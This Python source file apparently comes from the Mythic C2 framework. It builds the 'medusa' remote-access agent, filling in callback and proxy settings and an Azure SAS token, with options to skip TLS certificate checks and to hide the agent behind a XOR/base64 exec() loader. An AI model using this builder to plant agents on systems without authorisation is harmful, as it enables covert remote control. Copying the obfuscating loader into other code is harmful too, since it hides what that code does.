from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *

import asyncio, pathlib, os, tempfile, base64, hashlib, json, re

from itertools import cycle

class Medusa(PayloadType):

    name = "medusa"
    file_extension = "py"
    author = "@ajpc500"
    supported_os = [
        SupportedOS.Windows, SupportedOS.Linux, SupportedOS.MacOS
    ]
    wrapper = False
    wrapped_payloads = ["pickle_wrapper"]
    mythic_encrypts = True
    note = "This payload uses Python to create a simple agent"
    supports_dynamic_loading = True

    c2_profiles = ["http", "azure_blob"]

    build_parameters = [
        BuildParameter(
            name="output",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose output format",
            choices=["py", "base64"],
            default_value="py"
        ),
        BuildParameter(
            name="python_version",
            parameter_type=BuildParameterType.ChooseOne,
            description="Choose Python version",
            choices=["Python 3.8", "Python 2.7"],
            default_value="Python 3.8"
        ),
        BuildParameter(
            name="use_non_default_cryptography_lib",
            parameter_type=BuildParameterType.ChooseOne,
            description="Use non-default 'cryptography' Python library for comms (if not, manual crypto will be used)",
            choices=["No", "Yes"],
            default_value="No"
        ),
        BuildParameter(
            name="obfuscate_script",
            parameter_type=BuildParameterType.ChooseOne,
            description="XOR and Base64-encode agent code",
            choices=["Yes", "No"],
            default_value="Yes"
        ),
        BuildParameter(
            name="https_check",
            parameter_type=BuildParameterType.ChooseOne,
            description="Verify HTTPS certificate (if HTTP, leave yes)",
            choices=["Yes", "No"],
            default_value="Yes"
        )
    ]


    agent_path = pathlib.Path(".") / "medusa" / "mythic"
    agent_icon_path = agent_path / "medusa.svg"
    agent_code_path = pathlib.Path(".") / "medusa" / "agent_code"

    build_steps = [
        BuildStep(step_name="Gathering Files", step_description="Creating script payload"),
        BuildStep(step_name="Obfuscating Script", step_description="Encoding and encrypting script content")
    ]

    translation_container = None

    def getPythonVersionFile(self, directory, file):
        pyv = self.get_parameter("python_version")
        filename = ""
        if os.path.exists(os.path.join(directory, "{}.py".format(file))):
            #while we've specified a python version, this function is agnostic so just return the .py
            filename = os.path.join(directory, "{}.py".format(file))
        elif pyv == "Python 2.7":
            filename = os.path.join(directory, "{}.py2".format(file))
        elif pyv == "Python 3.8":
            filename = os.path.join(directory, "{}.py3".format(file))

        if not os.path.exists(filename) or not filename:
            return ""
        else:
            return filename

    def _read_file(self, path: str) -> str:
        with open(path, "r") as f:
            return f.read()

    def _apply_https_setting(self, base_code: str, profile_name: str) -> str:
        if self.get_parameter("https_check") != "No":
            return base_code.replace("#CERTSKIP", "")

        if profile_name == "azure_blob":
            return base_code.replace(
                "#CERTSKIP",
                """
    gcontext = ssl.create_default_context()
    gcontext.check_hostname = False
    gcontext.verify_mode = ssl.CERT_NONE\n"""
            )

        return base_code.replace("urlopen(req)", "urlopen(req, context=gcontext)").replace(
            "#CERTSKIP",
            """
        gcontext = ssl.create_default_context()
        gcontext.check_hostname = False
        gcontext.verify_mode = ssl.CERT_NONE\n"""
        )

    def _parse_transport_template(self, template_code: str) -> dict:
        parts = re.split(r"###\s*(IMPORTS|CLASS_FIELDS|FUNCTIONS|CONFIG)\s*###", template_code)
        sections = {"IMPORTS": "", "CLASS_FIELDS": "", "FUNCTIONS": "", "CONFIG": ""}
        for i in range(1, len(parts), 2):
            section_name = parts[i].strip()
            section_value = parts[i + 1]
            sections[section_name] = section_value.strip("\n")
        return sections

    def _validate_transport_template_format(self, profile_name: str, template_code: str):
        required = ["IMPORTS", "CLASS_FIELDS", "FUNCTIONS", "CONFIG"]
        markers = re.findall(r"###\s*(IMPORTS|CLASS_FIELDS|FUNCTIONS|CONFIG)\s*###", template_code)
        missing = [m for m in required if markers.count(m) == 0]
        duplicates = [m for m in required if markers.count(m) > 1]
        if missing or duplicates:
            details = []
            if missing:
                details.append("missing markers: {}".format(", ".join(missing)))
            if duplicates:
                details.append("duplicate markers: {}".format(", ".join(duplicates)))
            raise ValueError(
                "Transport template transport_{} has invalid section markers ({})".format(
                    profile_name,
                    "; ".join(details)
                )
            )

    def _validate_transport_sections(self, profile_name: str, sections: dict):
        required_non_empty = ["FUNCTIONS", "CONFIG"]
        missing = [s for s in required_non_empty if not sections.get(s, "").strip()]
        if missing:
            raise ValueError(
                "Transport template transport_{} is missing required non-empty sections: {}".format(
                    profile_name,
                    ", ".join(missing)
                )
            )

    def _validate_core_markers_replaced(self, base_code: str, profile_name: str):
        unresolved = [
            marker for marker in [
                "TRANSPORT_IMPORTS",
                "TRANSPORT_CLASS_FIELDS",
                "TRANSPORT_FUNCTIONS",
                "TRANSPORT_CONFIG",
            ]
            if marker in base_code
        ]
        if unresolved:
            raise ValueError(
                "Core template marker replacement failed for transport_{}; unresolved markers: {}".format(
                    profile_name,
                    ", ".join(unresolved)
                )
            )

    def _get_base_code_for_profile(self, profile_name: str) -> str:
        base_path = self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), "base_agent_core")
        transport_path = self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), f"transport_{profile_name}")
        if not base_path:
            raise ValueError("Missing base_agent_core template for selected python version")
        if not transport_path:
            raise ValueError("Missing transport template for profile {} and selected python version".format(profile_name))

        base_code = self._read_file(base_path)
        transport_template = self._read_file(transport_path)
        self._validate_transport_template_format(profile_name, transport_template)
        transport_sections = self._parse_transport_template(transport_template)
        self._validate_transport_sections(profile_name, transport_sections)

        base_code = base_code.replace("TRANSPORT_IMPORTS", transport_sections["IMPORTS"])
        base_code = base_code.replace("TRANSPORT_CLASS_FIELDS", transport_sections["CLASS_FIELDS"])
        base_code = base_code.replace("TRANSPORT_FUNCTIONS", transport_sections["FUNCTIONS"])
        base_code = base_code.replace("TRANSPORT_CONFIG", transport_sections["CONFIG"])
        self._validate_core_markers_replaced(base_code, profile_name)
        return base_code

    def _to_python_literal(self, value):
        if isinstance(value, str):
            return value
        return json.dumps(value).replace("false", "False").replace("true", "True").replace("null", "None")

    def _apply_c2_parameter_replacements(self, base_code: str, c2):
        params = c2.get_parameters_dict()
        replacements = {
            "callback_host": params.get("callback_host", ""),
            "callback_port": params.get("callback_port", ""),
            "post_uri": params.get("post_uri", ""),
            "get_uri": params.get("get_uri", ""),
            "query_path_name": params.get("query_path_name", ""),
            "proxy_host": params.get("proxy_host", ""),
            "proxy_user": params.get("proxy_user", ""),
            "proxy_pass": params.get("proxy_pass", ""),
            "proxy_port": params.get("proxy_port", ""),
            "callback_interval": params.get("callback_interval", ""),
            "callback_jitter": params.get("callback_jitter", ""),
            "killdate": params.get("killdate", ""),
            "AESPSK": params.get("AESPSK", {}),
            "encrypted_exchange_check": params.get("encrypted_exchange_check", ""),
            "HEADER_PLACEHOLDER": params.get("headers", {}),
        }

        for placeholder, value in replacements.items():
            if placeholder in base_code:
                base_code = base_code.replace(placeholder, self._to_python_literal(value))
        return base_code

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""
        try:
            command_code = ""
            for cmd in self.commands.get_commands():
                command_path = self.getPythonVersionFile(self.agent_code_path, cmd)
                if not command_path:
                    build_msg += "{} command not available for {}.\n".format(cmd, self.get_parameter("python_version"))
                else:
                    command_code += self._read_file(command_path) + "\n"

            selected_c2 = None
            for c2 in self.c2info:
                profile_name = c2.get_c2profile()["name"]
                if profile_name in ["http", "azure_blob"]:
                    selected_c2 = c2
                    break

            if selected_c2 is None:
                build_msg += "No supported C2 profile selected for {}.\n".format(self.name)
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = "Error building payload: " + build_msg
                return resp

            profile_name = selected_c2.get_c2profile()["name"]
            base_code = self._get_base_code_for_profile(profile_name)

            if profile_name == "azure_blob":
                params = selected_c2.get_parameters_dict()
                killdate = params.get("killdate", None)
                callback_interval = str(params.get("callback_interval", "30"))
                callback_jitter = str(params.get("callback_jitter", "10"))

                config_data = await SendMythicRPCOtherServiceRPC(MythicRPCOtherServiceRPCMessage(
                    ServiceName="azure_blob",
                    ServiceRPCFunction="generate_config",
                    ServiceRPCFunctionArguments={
                        "killdate": killdate,
                        "payload_uuid": self.uuid
                    }
                ))
                if not config_data.Success:
                    resp.status = BuildStatus.Error
                    resp.build_stderr = f"Build failed: {config_data.Error}"
                    return resp

                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Provisioning Azure Container",
                        StepStdout=f"Container provisioned with scoped SAS token\nEndpoint: {config_data.Result['blob_endpoint']}",
                        StepSuccess=True
                    )
                )
                await SendMythicRPCPayloadUpdatebuildStep(
                    MythicRPCPayloadUpdateBuildStepMessage(
                        PayloadUUID=self.uuid,
                        StepName="Stamping Configuration",
                        StepStdout="Embedding Azure configuration into agent",
                        StepSuccess=True
                    )
                )

                base_code = base_code.replace("BLOB_ENDPOINT_PLACEHOLDER", config_data.Result["blob_endpoint"])
                base_code = base_code.replace("CONTAINER_NAME_PLACEHOLDER", config_data.Result["container_name"])
                base_code = base_code.replace("CONTAINER_SAS_PLACEHOLDER", config_data.Result["sas_token"])
                base_code = base_code.replace("CALLBACK_INTERVAL_PLACEHOLDER", callback_interval)
                base_code = base_code.replace("CALLBACK_JITTER_PLACEHOLDER", callback_jitter)
                base_code = base_code.replace("AGENT_UUID_PLACEHOLDER", self.uuid)

            base_code = self._apply_https_setting(base_code, profile_name)


            if self.get_parameter("use_non_default_cryptography_lib") == "Yes":
                crypto_code = self._read_file(self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib"))
            else:
                crypto_code = self._read_file(self.getPythonVersionFile(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto"))

            base_code = base_code.replace("CRYPTO_HERE", crypto_code)
            base_code = base_code.replace("UUID_HERE", self.uuid)
            base_code = base_code.replace("#COMMANDS_HERE", command_code)

            base_code = self._apply_c2_parameter_replacements(base_code, selected_c2)

            if build_msg != "":
                resp.build_stderr = build_msg
                resp.set_status(BuildStatus.Error)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Gathering Files",
                StepStdout="Found all files for payload",
                StepSuccess=True
            ))

            if self.get_parameter("obfuscate_script") == "Yes":
                key = hashlib.md5(os.urandom(128)).hexdigest().encode()
                encrypted_content = ''.join(chr(c^k) for c,k in zip(base_code.encode(), cycle(key))).encode()
                b64_enc_content = base64.b64encode(encrypted_content)
                xor_func = "chr(c^k)" if self.get_parameter("python_version") == "Python 3.8" else "chr(ord(c)^ord(k))"
                base_code = """import base64, itertools
exec(''.join({} for c,k in zip(base64.b64decode({}), itertools.cycle({}))).encode())
""".format(xor_func, b64_enc_content, key)

                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Obfuscating Script",
                    StepStdout="Script successfully obfuscated.",
                    StepSuccess=True
                ))
            else:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Obfuscating Script",
                    StepStdout="Obfuscation not requested, skipping.",
                    StepSuccess=True
                ))

            if self.get_parameter("output") == "base64":
                resp.payload = base64.b64encode(base_code.encode())
                resp.build_message = "Successfully Built"
            else:
                resp.payload = base_code.encode()
                resp.build_message = "Successfully built!"
        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
